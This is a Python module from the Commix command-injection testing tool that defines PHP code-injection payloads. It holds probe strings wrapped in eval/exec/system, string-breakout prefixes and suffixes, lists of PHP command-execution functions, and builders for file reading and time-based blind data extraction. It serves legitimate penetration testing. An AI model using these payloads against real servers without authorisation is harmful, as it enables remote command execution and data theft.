#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "php"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "PHP"

# A call whose output says at once that code was evaluated, and which version evaluated it.
PROBE = "phpinfo()"

# The probe on its own, and wrapped in the functions that would run it where a bare call is not
# evaluated - each is tried until one of them answers.
PROBE_FUNCTIONS = ["" + PROBE + "",
  "exec(" + PROBE + ")",
  "eval(" + PROBE + ")",
  "system(" + PROBE + ")"
]

# The same probes broken into the string being evaluated, one boundary per row.
PROBE_PAYLOADS = [
  [".print(" + x + ")" for x in PROBE_FUNCTIONS],
  [")'}" + x + "'#" for x in PROBE_FUNCTIONS],
  ["'." + x + ".'" for x in PROBE_FUNCTIONS],
  ["{${" + x + "}}" for x in PROBE_FUNCTIONS],
  ["\\\\/{${" + x + "}}\\/\\" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own output looks like coming back, and the interpreter's complaints that say a
# payload reached an evaluated string even where nothing was printed.
PROBE_REGEX = r"PHP Version </td><td class=\"v\">(([\w\.]+))"
WARNINGS = ["eval()'d code", "runtime-created function", "usort()", "assert()", "preg_replace()"]

# The language's own functions that run a command, widest first as the level rises. Each is wrapped
# as '${name(' and used as a prefix, so only the ones taking the command as their one argument fit.
EXECUTION_FUNCTIONS_LVL1 = ["exec"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["system", "shell_exec"]
# 'assert' evaluates its argument as code where the version still allows it, and 'expect_popen'
# comes with the expect extension - both take a single string, as the wrapping above requires.
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["passthru", "proc_open", "popen",
                                                      "assert", "expect_popen"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# Concatenation, concatenation out of a single-quoted string, and variable-variable interpolation.
PREFIXES_LVL1 = [".", "'.", "{${"]
# Closing a call the value sits inside, and interpolation from within a double-quoted string.
PREFIXES_LVL2 = PREFIXES_LVL1 + [")'}", "');}", "\".", "${"]
# Ending the statement outright, and leaving a comment the value was written into.
PREFIXES_LVL3 = PREFIXES_LVL2 + ["')", "\")", ");}", "\");}", ")", ";", "'", "\";", "';", "*/", ""]

SUFFIXES_LVL1 = [ "",  ".'", "}}"]
# Closing the interpolation, and commenting out whatever the application appends behind it.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["'#", "}", "}\""]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#", ";//", ";#", "/*"]

"""
Wrap the shell commands a payload runs in this language's print statement.

Every command has to leave its output on a line of its own: the results are read back as marker,
output and marker separated by newlines, so anything printed without one runs into the next marker.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "print(" + ".".join("`" + command + "`" for command in commands) + ")"
  return "print(`" + (chain or separator).join(commands) + "`)" + TERMINATOR

"""
The expressions every payload is built out of, spelled the way this language spells them.

What a technique asks of a sink is the same whichever language is evaluating: run this, tell me how
long the answer is, tell me its Nth byte, wait this long if the answer is yes. Only the spelling
differs - so the techniques ask through the names below, and a language is added by writing them
again rather than by touching a payload.
"""

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return "${" + function + "("

# Run a command and yield its output.
def run(cmd):
  return "`" + cmd + "`"

# Read a file and yield its contents.
def read_file(path):
  return run("cat " + path)

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.
def trim(expr):
  return "rtrim(" + expr + ")"

# How many bytes an expression is.
def length(expr):
  return "strlen(" + expr + ")"

# The ordinal of an expression's Nth byte, counting from zero.
def ordinal(expr, index):
  return "ord(substr(" + expr + "," + str(index) + ",1))"

# An expression's value read as a number, for a command whose output is one.
def to_number(expr):
  return "intval(" + expr + ")"

# Wait for as long as the condition is true, and no time at all when it is false.
def delay(timesec, condition):
  return "sleep(" + str(timesec) + "*(" + condition + "))"

# Evaluate one expression and then another, within a single expression.
def sequence(first, second):
  return first + "." + second

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
